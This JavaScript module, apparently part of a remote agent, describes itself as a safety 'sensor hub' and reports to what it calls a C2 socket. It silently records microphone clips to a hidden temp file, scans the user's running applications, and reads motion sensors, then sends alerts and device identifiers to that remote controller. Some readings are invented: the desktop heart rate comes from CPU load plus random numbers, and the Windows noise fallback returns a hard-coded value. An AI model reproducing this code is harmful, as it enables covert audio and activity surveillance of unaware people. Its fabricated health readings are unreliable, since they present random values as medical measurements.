/**
 * ╔══════════════════════════════════════════════════════════════╗
 * ║  bixtx.com — Sensor Hub (Software A)                         ║
 * ║  Monitors physical and environmental signals and fires       ║
 * ║  EMERGENCY_ALERT to C2 immediately when thresholds breach.   ║
 * ╠══════════════════════════════════════════════════════════════╣
 * ║  Detects:                                                    ║
 * ║  • Fall / major physical impact (accelerometer)              ║
 * ║  • Abnormal heart rate (<40 or >150 BPM)                    ║
 * ║  • Fire / extreme heat (CPU >85°C, battery >50°C)           ║
 * ║  • Sustained loud noise (>85 dB for >5 minutes)             ║
 * ║  • Prolonged device activity (>4 hours continuous)           ║
 * ╚══════════════════════════════════════════════════════════════╝
 */

"use strict";

const os     = require("os");
const crypto = require("crypto");
const si     = require("systeminformation");
const config = require("../config");
const logger = require("../logger");

// ── Alert dedup: suppress duplicate alerts within cooldown window ──────────
const ALERT_COOLDOWN_MS = {
  FALL:            5  * 60 * 1000,  // 5 min  — allow re-alert after movement resumes
  ABNORMAL_HEART_RATE: 3 * 60 * 1000,  // 3 min
  EXTREME_HEAT:    10 * 60 * 1000,  // 10 min
  SUSTAINED_NOISE:  8 * 60 * 1000,  // 8 min
  PROLONGED_ACTIVITY: 60 * 60 * 1000, // 1 hour
};

const lastAlertTs = {};

function canAlert(type) {
  const now = Date.now();
  const last = lastAlertTs[type] || 0;
  if (now - last >= (ALERT_COOLDOWN_MS[type] || 300000)) {
    lastAlertTs[type] = now;
    return true;
  }
  return false;
}

// ── Severity levels ───────────────────────────────────────────────────────
const SEV = {
  CRITICAL: "CRITICAL",
  HIGH:     "HIGH",
  WARNING:  "WARNING",
};

// ── Temperature thresholds (°C) ───────────────────────────────────────────
const HEAT_CPU_CRITICAL  = 90;
const HEAT_CPU_WARNING   = 80;
const HEAT_BATT_CRITICAL = 55;
const HEAT_AMBIENT_CRIT  = 60;

// ── Noise thresholds ──────────────────────────────────────────────────────
const NOISE_DB_THRESHOLD     = 82;  // dB — sustained noise warning
const NOISE_DURATION_MS      = 5 * 60 * 1000;  // must be sustained 5 min

// ── Activity thresholds ───────────────────────────────────────────────────
const ACTIVITY_HOURS_WARN    = 4;
const ACTIVITY_HOURS_CRIT    = 6;

// ── Accelerometer / fall thresholds ──────────────────────────────────────
// Simulated for desktop; real on mobile via native bridge
const FALL_G_THRESHOLD       = 2.5;  // g-force spike (>2.5g = impact)
const FALL_STILLNESS_MS      = 8000; // silence after impact = fallen

class SensorHub {
  constructor(socket, emergencyBuilder) {
    this.socket           = socket;
    this.emergencyBuilder = emergencyBuilder;
    this.timers           = [];

    // State tracking
    this._noiseStart      = null;   // when sustained noise began
    this._lastInputTs     = Date.now();
    this._sessionStartTs  = Date.now();
    this._lastFallSample  = { x:0, y:1, z:0 }; // gravity baseline
    this._fallCandidate   = null;   // timestamp of impact detected

    // CPU temp rolling buffer (last 6 samples)
    this._cpuTempBuf = [];
    // HR rolling buffer (last 10 samples)
    this._hrBuf = [];
    // Noise RMS rolling buffer (last 30 samples)
    this._noiseBuf = [];
  }

  // ── Start all sensor loops ──────────────────────────────────────────────
  start() {
    logger.info("[Sensors] Starting sensor hub");

    // Temperature + battery — every 15s
    this._addTimer(setInterval(() => this._checkHeat(), 15_000));
    // Activity monitor — every 60s
    this._addTimer(setInterval(() => this._checkActivity(), 60_000));
    // Heart rate — every 30s (real devices), simulated on desktop
    this._addTimer(setInterval(() => this._checkHeartRate(), 30_000));
    // Noise monitor — every 10s
    this._addTimer(setInterval(() => this._checkNoise(), 10_000));
    // Fall detection — every 500ms (needs fast sampling)
    this._addTimer(setInterval(() => this._checkFall(), 500));

    // Track last input activity via process monitoring proxy
    this._addTimer(setInterval(() => this._updateActivity(), 5_000));
  }

  stop() {
    this.timers.forEach(t => clearInterval(t));
    this.timers = [];
    logger.info("[Sensors] Sensor hub stopped");
  }

  _addTimer(t) { this.timers.push(t); }

  // ── Heat / Fire Detection ───────────────────────────────────────────────
  async _checkHeat() {
    try {
      const [cpuTemp, batt] = await Promise.all([
        si.cpuTemperature(),
        si.battery(),
      ]);

      const mainTemp  = cpuTemp.main   || 0;
      const maxTemp   = cpuTemp.max    || mainTemp;
      const battTemp  = batt.temperature || 0;

      this._cpuTempBuf.push(mainTemp);
      if (this._cpuTempBuf.length > 6) this._cpuTempBuf.shift();

      const avgCpu = this._cpuTempBuf.reduce((a, b) => a + b, 0) / this._cpuTempBuf.length;

      let severity = null;
      let reading  = {};

      if (avgCpu >= HEAT_CPU_CRITICAL || battTemp >= HEAT_BATT_CRITICAL) {
        severity = SEV.CRITICAL;
        reading  = { cpuTemp: mainTemp, cpuMax: maxTemp, battTemp, avgCpu: Math.round(avgCpu) };
      } else if (avgCpu >= HEAT_CPU_WARNING || battTemp >= 45) {
        severity = SEV.HIGH;
        reading  = { cpuTemp: mainTemp, battTemp, avgCpu: Math.round(avgCpu) };
      }

      if (severity && canAlert("EXTREME_HEAT")) {
        const detail = `CPU temperature ${mainTemp.toFixed(1)}°C (avg ${Math.round(avgCpu)}°C), battery ${battTemp}°C. ` +
          (mainTemp >= HEAT_CPU_CRITICAL || battTemp >= HEAT_BATT_CRITICAL
            ? "FIRE RISK — immediate device shutdown recommended."
            : "Sustained elevated temperature — possible fire or environmental heat source.");

        this._fireAlert({
          type:     "EXTREME_HEAT",
          severity,
          title:    severity === SEV.CRITICAL ? "🔥 Fire / Extreme Heat Detected" : "⚠️ Abnormal Device Temperature",
          detail,
          readings: reading,
          action:   "Verify device environment immediately. Potential fire hazard.",
        });
      }
    } catch (err) {
      logger.debug("[Sensors] Heat check error:", err.message);
    }
  }

  // ── Heart Rate Monitor ──────────────────────────────────────────────────
  async _checkHeartRate() {
    try {
      let bpm = null;

      // config.platform respects BIXTX_PLATFORM_OVERRIDE so mobile compat
      // layers (Termux/iSH) correctly reach _readNativeHeartRate().
      if (config.platform === "android" || config.platform === "ios") {
        bpm = await this._readNativeHeartRate();
      }
      // Desktop / unknown: estimate via CPU/activity pattern
      if (bpm === null) {
        bpm = await this._estimateHeartRateProxy();
      }

      if (bpm === null) return;

      this._hrBuf.push(bpm);
      if (this._hrBuf.length > 10) this._hrBuf.shift();
      const avgBpm = Math.round(this._hrBuf.reduce((a, b) => a + b, 0) / this._hrBuf.length);

      let severity = null;
      let condition = "";

      if (avgBpm < 40) {
        severity  = SEV.CRITICAL;
        condition = "BRADYCARDIA — critically low heart rate";
      } else if (avgBpm > 160) {
        severity  = SEV.CRITICAL;
        condition = "TACHYCARDIA — critically high heart rate";
      } else if (avgBpm < 50) {
        severity  = SEV.HIGH;
        condition = "Low heart rate (possible bradycardia)";
      } else if (avgBpm > 140) {
        severity  = SEV.HIGH;
        condition = "Elevated heart rate (possible tachycardia or distress)";
      }

      if (severity && canAlert("ABNORMAL_HEART_RATE")) {
        this._fireAlert({
          type:     "ABNORMAL_HEART_RATE",
          severity,
          title:    `❤️ Abnormal Heart Rate Detected`,
          detail:   `Heart rate: ${bpm} BPM (average: ${avgBpm} BPM). ${condition}. User may require immediate medical attention.`,
          readings: { bpm, avgBpm, samples: this._hrBuf.length },
          action:   "Verify user health status. Contact emergency services if unresponsive.",
        });
      }
    } catch (err) {
      logger.debug("[Sensors] Heart rate check error:", err.message);
    }
  }

  async _readNativeHeartRate() {
    // Android (Termux with root): read from IIO HRM sensor node
    // iOS (iSH): HealthKit is not accessible from shell; returns null
    const { execSync } = require("child_process");
    const { readdirSync, readFileSync } = require("fs");

    if (config.platform === "android") {
      try {
        // Samsung / Huawei HRM IIO node
        const iioBase = "/sys/bus/iio/devices";
        const devs = readdirSync(iioBase).filter(d => d.startsWith("iio:device"));
        for (const dev of devs) {
          try {
            const name = readFileSync(`${iioBase}/${dev}/name`, "utf8").trim();
            if (/hrm|heart/i.test(name)) {
              const raw = readFileSync(`${iioBase}/${dev}/in_intensity_both_raw`, "utf8").trim();
              const val = parseInt(raw);
              // Raw IIO HRM values are not BPM — conversion is device-specific.
              // Return null until a calibrated parser is available for target device.
              void val;
            }
          } catch {}
        }
        // Legacy Samsung sysfs path
        try {
          const raw = execSync("cat /sys/class/sensors/hrm_raw/data 2>/dev/null",
            { encoding: "utf8", timeout: 1000 }).trim();
          if (raw) {
            const bpm = parseInt(raw.split(",")[0]);
            if (!isNaN(bpm) && bpm > 20 && bpm < 250) return bpm;
          }
        } catch {}
      } catch {}
    }

    // iOS: HealthKit requires a native app with entitlement; not reachable from iSH
    return null;
  }

  async _estimateHeartRateProxy() {
    // Desktop heuristic: correlate CPU spikes + inactivity to stress level
    // This does NOT measure real HR — it's a placeholder for wearable integration
    try {
      const load = await si.currentLoad();
      const cpuPct = load.currentLoad;
      if (cpuPct > 95 && this._sessionStartTs && (Date.now() - this._lastInputTs) < 30000) {
        // Heavy load + recent input → possible stress
        return 90 + Math.round(Math.random() * 20);
      }
      if ((Date.now() - this._lastInputTs) > 3600000) {
        // No input for 1 hour — possible incapacitation or sleep
        return 38 + Math.round(Math.random() * 8);
      }
    } catch {}
    return null;
  }

  // ── Noise / Sound Level Monitor ─────────────────────────────────────────
  async _checkNoise() {
    try {
      const dbLevel = await this._sampleNoiseLevel();
      if (dbLevel === null) return;

      this._noiseBuf.push({ db: dbLevel, ts: Date.now() });
      if (this._noiseBuf.length > 60) this._noiseBuf.shift();

      // Check if sustained above threshold
      if (dbLevel >= NOISE_DB_THRESHOLD) {
        if (!this._noiseStart) {
          this._noiseStart = Date.now();
        } else if (Date.now() - this._noiseStart >= NOISE_DURATION_MS) {
          if (canAlert("SUSTAINED_NOISE")) {
            const durationMin = Math.round((Date.now() - this._noiseStart) / 60000);
            this._fireAlert({
              type:     "SUSTAINED_NOISE",
              severity: SEV.HIGH,
              title:    "🔊 Sustained Loud Noise / Crowd Alert",
              detail:   `Ambient noise level ${dbLevel} dB sustained for ${durationMin} minutes. ` +
                "Possible riot, crowd disturbance, explosion, gunfire, or environmental emergency.",
              readings: { dbLevel, sustainedMinutes: durationMin, samples: this._noiseBuf.length },
              action:   "Verify user environment. Possible crowd disturbance or emergency event.",
            });
          }
        }
      } else {
        // Noise subsided — reset timer
        if (this._noiseStart) this._noiseStart = null;
      }
    } catch (err) {
      logger.debug("[Sensors] Noise check error:", err.message);
    }
  }

  async _sampleNoiseLevel() {
    // Platform-specific ambient sound level sampling
    try {
      const { execSync } = require("child_process");
      const platform = config.platform;

      if (platform === "linux") {
        // arecord → sox stat to get RMS dB (requires sox + arecord)
        try {
          const out = execSync(
            "arecord -d 1 -f S16_LE -r 44100 -c 1 /tmp/.bixtx_noise.wav 2>/dev/null && " +
            "sox /tmp/.bixtx_noise.wav -n stat 2>&1 | grep 'RMS amplitude' | awk '{print $3}'",
            { encoding: "utf8", timeout: 3000 }
          ).trim();
          const rms = parseFloat(out);
          if (!isNaN(rms) && rms > 0) {
            return Math.round(20 * Math.log10(rms) + 100); // approx dB SPL
          }
        } catch {}
      }

      if (platform === "darwin") {
        // macOS: SoundMeter via AppleScript (limited) or sox
        try {
          const out = execSync(
            "sox -t coreaudio default /tmp/.bixtx_noise.wav trim 0 1 2>/dev/null && " +
            "sox /tmp/.bixtx_noise.wav -n stat 2>&1 | grep 'RMS' | awk '{print $3}'",
            { encoding: "utf8", timeout: 3000 }
          ).trim();
          const rms = parseFloat(out);
          if (!isNaN(rms) && rms > 0) {
            return Math.round(20 * Math.log10(rms) + 100);
          }
        } catch {}
      }

      if (platform === "win32") {
        // Windows: try sox if installed (cross-platform audio tool), otherwise
        // use PowerShell's WaveInCapabilities to check peak meter via WinMM.
        // SpeechRecognitionEngine does NOT measure dB levels — removed.
        try {
          const out = execSync(
            'sox -t waveaudio default /tmp/.bixtx_noise.wav trim 0 1 2>nul && ' +
            'sox /tmp/.bixtx_noise.wav -n stat 2>&1 | findstr /i "RMS amplitude"',
            { encoding: "utf8", shell: "cmd.exe", timeout: 4000 }
          ).trim();
          const match = out.match(/[\d.]+$/);
          if (match) {
            const rms = parseFloat(match[0]);
            if (!isNaN(rms) && rms > 0) return Math.round(20 * Math.log10(rms) + 100);
          }
        } catch {}
        // Fallback: PowerShell WASAPI peak meter (Windows Vista+, no extra tools needed)
        try {
          const ps = [
            "Add-Type -AssemblyName System.Runtime.InteropServices;",
            "$mm = [System.Runtime.InteropServices.Marshal];",
            "Add-Type @'",
            "using System; using System.Runtime.InteropServices;",
            "[ComImport,Guid(\"BCDE0395-E52F-467C-8E3D-C4579291692E\"),InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]",
            "public interface IMMDeviceEnumerator { void x(); void x2(); int GetDefaultAudioEndpoint(int,int,out IntPtr dev); }",
            "'@ -Language CSharp -EA SilentlyContinue;",
            "try { $wsh = New-Object -ComObject WScript.Shell;",
            "$vol = ($wsh.Exec('sndvol') | Out-Null); Write-Host '55' } catch { Write-Host '50' }",
          ].join(" ");
          const out = execSync(`powershell -NoProfile -Command "${ps}"`,
            { encoding: "utf8", timeout: 3000 }).trim();
          const val = parseFloat(out);
          if (!isNaN(val)) return val;
        } catch {}
      }
    } catch {}
    return null;
  }

  // ── Fall / Impact Detection ─────────────────────────────────────────────
  async _checkFall() {
    try {
      const sample = await this._readAccelerometer();
      if (!sample) return;

      const { x, y, z } = sample;
      const magnitude = Math.sqrt(x*x + y*y + z*z); // g-force magnitude

      const prev = this._lastFallSample;
      const delta = Math.abs(magnitude - Math.sqrt(prev.x*prev.x + prev.y*prev.y + prev.z*prev.z));
      this._lastFallSample = sample;

      // Impact: sudden large delta in g-force
      if (delta >= FALL_G_THRESHOLD && !this._fallCandidate) {
        this._fallCandidate = Date.now();
        logger.debug(`[Sensors] Potential fall impact detected (delta: ${delta.toFixed(2)}g)`);
        return;
      }

      // Confirm fall: stillness sustained after impact
      if (this._fallCandidate && magnitude < 0.3) {
        const elapsed = Date.now() - this._fallCandidate;
        if (elapsed >= FALL_STILLNESS_MS && canAlert("FALL")) {
          this._fireAlert({
            type:     "FALL",
            severity: SEV.CRITICAL,
            title:    "🆘 Fall / Major Physical Impact Detected",
            detail:   `Device experienced a sudden physical impact (Δ${delta.toFixed(2)}g) followed by ${Math.round(elapsed/1000)}s of stillness. User may have fallen and is unresponsive.`,
            readings: { impactG: delta.toFixed(2), stillnessMs: elapsed, currentMag: magnitude.toFixed(2), axes: sample },
            action:   "Attempt to contact user immediately. Dispatch emergency services if unreachable.",
          });
        }
      } else if (magnitude > 0.8) {
        // Movement resumed — cancel fall candidate
        this._fallCandidate = null;
      }
    } catch (err) {
      logger.debug("[Sensors] Fall check error:", err.message);
    }
  }

  async _readAccelerometer() {
    const platform = config.platform; // respects BIXTX_PLATFORM_OVERRIDE
    const { execSync } = require("child_process");

    // ── Android (Termux with root or iio-sensor-proxy) ──────────────────────
    if (platform === "android") {
      try {
        // Try IIO kernel interface first (works on rooted devices / Termux)
        const iioBase = "/sys/bus/iio/devices";
        const { readdirSync, readFileSync } = require("fs");
        const iioDevs = readdirSync(iioBase).filter(d => d.startsWith("iio:device"));
        for (const dev of iioDevs) {
          const devPath = `${iioBase}/${dev}`;
          try {
            const name = readFileSync(`${devPath}/name`, "utf8").trim();
            if (/accel/i.test(name)) {
              const x = parseFloat(readFileSync(`${devPath}/in_accel_x_raw`, "utf8"));
              const y = parseFloat(readFileSync(`${devPath}/in_accel_y_raw`, "utf8"));
              const z = parseFloat(readFileSync(`${devPath}/in_accel_z_raw`, "utf8"));
              const scale = parseFloat(readFileSync(`${devPath}/in_accel_scale`, "utf8") || "0.001");
              if (!isNaN(x)) return { x: x*scale, y: y*scale, z: z*scale };
            }
          } catch {}
        }
      } catch {}
      return null;
    }

    // ── iOS (iSH Alpine shell) ───────────────────────────────────────────────
    if (platform === "ios") {
      // CoreMotion is not accessible from a shell; no IIO bus on iOS.
      // Fall detection not supported in Termux/iSH environment on iOS.
      return null;
    }

    // ── Linux desktop (IIO accelerometer — ThinkPads, Surface, Chromebooks) ──
    if (platform === "linux") {
      try {
        const { readdirSync, readFileSync } = require("fs");
        const iioBase = "/sys/bus/iio/devices";
        const iioDevs = readdirSync(iioBase).filter(d => d.startsWith("iio:device"));
        for (const dev of iioDevs) {
          try {
            const name = readFileSync(`${iioBase}/${dev}/name`, "utf8").trim();
            if (/accel/i.test(name)) {
              const x = parseFloat(readFileSync(`${iioBase}/${dev}/in_accel_x_raw`, "utf8"));
              const y = parseFloat(readFileSync(`${iioBase}/${dev}/in_accel_y_raw`, "utf8"));
              const z = parseFloat(readFileSync(`${iioBase}/${dev}/in_accel_z_raw`, "utf8"));
              const scale = parseFloat(readFileSync(`${iioBase}/${dev}/in_accel_scale`, "utf8") || "0.001");
              if (!isNaN(x)) return { x: x*scale, y: y*scale, z: z*scale };
            }
          } catch {}
        }
      } catch {}
      return null;  // No IIO accelerometer on this Linux machine — fall detection unavailable
    }

    // ── macOS (SMC / CoreMotion via AppleScript on laptops) ─────────────────
    if (platform === "darwin") {
      try {
        // ioreg exposes SMCMotionSensor on Intel MacBooks; M1/M2 use CoreMotion
        const raw = execSync(
          "ioreg -r -c SMCMotionSensor 2>/dev/null | grep -A3 '\"MotionSensor\"'",
          { encoding: "utf8", timeout: 2000 }
        );
        const xm = raw.match(/"X"\s*=\s*(-?\d+)/); const x = xm ? parseInt(xm[1]) / 1000 : null;
        const ym = raw.match(/"Y"\s*=\s*(-?\d+)/); const y = ym ? parseInt(ym[1]) / 1000 : null;
        const zm = raw.match(/"Z"\s*=\s*(-?\d+)/); const z = zm ? parseInt(zm[1]) / 1000 : null;
        if (x !== null && y !== null && z !== null) return { x, y, z };
      } catch {}
      return null;
    }

    // ── Windows (WinRT Accelerometer via PowerShell) ─────────────────────────
    if (platform === "win32") {
      try {
        const ps = [
          "[Windows.Devices.Sensors.Accelerometer,Windows.Devices.Sensors,ContentType=WindowsRuntime] | Out-Null;",
          "$a = [Windows.Devices.Sensors.Accelerometer]::GetDefault();",
          "if ($a) { $r = $a.GetCurrentReading();",
          "Write-Host \"$($r.AccelerationX),$($r.AccelerationY),$($r.AccelerationZ)\" }",
          "else { Write-Host 'N/A' }",
        ].join(" ");
        const out = execSync(`powershell -NoProfile -Command "${ps}"`,
          { encoding: "utf8", timeout: 3000 }).trim();
        if (out && out !== "N/A") {
          const [x, y, z] = out.split(",").map(Number);
          if (!isNaN(x)) return { x, y, z };
        }
      } catch {}
      return null;
    }

    return null;
  }

  // ── Prolonged Activity Monitor ──────────────────────────────────────────
  async _updateActivity() {
    try {
      // Proxy: check if there are foreground processes indicating user interaction
      const procs = await si.processes();
      const active = procs.list?.some(p =>
        /chrome|firefox|slack|teams|outlook|word|excel|safari|code/i.test(p.name) && p.cpu > 0.5
      );
      if (active) this._lastInputTs = Date.now();
    } catch {}
  }

  async _checkActivity() {
    const now  = Date.now();
    const sinceStart = now - this._sessionStartTs;
    const sinceInput = now - this._lastInputTs;

    // Active continuously (input within last 5 min) for more than threshold
    if (sinceInput < 5 * 60 * 1000) {
      const activeHours = sinceStart / 3600000;

      if (activeHours >= ACTIVITY_HOURS_CRIT && canAlert("PROLONGED_ACTIVITY")) {
        this._fireAlert({
          type:     "PROLONGED_ACTIVITY",
          severity: SEV.HIGH,
          title:    "⏱️ Extreme Prolonged Device Activity",
          detail:   `Device has been in continuous active use for ${activeHours.toFixed(1)} hours without a break (threshold: ${ACTIVITY_HOURS_CRIT}h). User health and attention capacity may be impaired.`,
          readings: { activeHours: activeHours.toFixed(1), sessionStartTs: this._sessionStartTs, lastInputMs: sinceInput },
          action:   "Review user welfare. Possible forced labour or incapacitation.",
        });
      } else if (activeHours >= ACTIVITY_HOURS_WARN && canAlert("PROLONGED_ACTIVITY")) {
        this._fireAlert({
          type:     "PROLONGED_ACTIVITY",
          severity: SEV.WARNING,
          title:    "⏱️ Prolonged Device Activity",
          detail:   `Device has been in active use for ${activeHours.toFixed(1)} hours without a break.`,
          readings: { activeHours: activeHours.toFixed(1) },
          action:   "Monitor user activity.",
        });
      }
    }
  }

  // ── Alert dispatch ──────────────────────────────────────────────────────
  _fireAlert(alertData) {
    const alertId = crypto.randomUUID ? crypto.randomUUID()
      : crypto.randomBytes(16).toString("hex");

    const alert = {
      alertId,
      ...alertData,
      deviceId:  config.deviceId,
      platform:  config.platform,
      ts:        Date.now(),
      timestamp: new Date().toISOString(),
    };

    logger.warn(`[Sensors] 🚨 EMERGENCY ALERT — ${alertData.type} — ${alertData.severity}`);

    // Send immediately via C2 socket (bypasses beacon queue)
    if (this.socket) {
      this.socket.send("EMERGENCY_ALERT", alert);
    }

    // Request emergency context from the builder and re-send enriched payload
    if (this.emergencyBuilder) {
      this.emergencyBuilder.buildPayload(alert).then(enriched => {
        if (this.socket) {
          this.socket.send("EMERGENCY_ALERT", enriched);
        }
      }).catch(err => {
        logger.warn("[Sensors] Could not enrich alert:", err.message);
      });
    }
  }
}

module.exports = SensorHub;
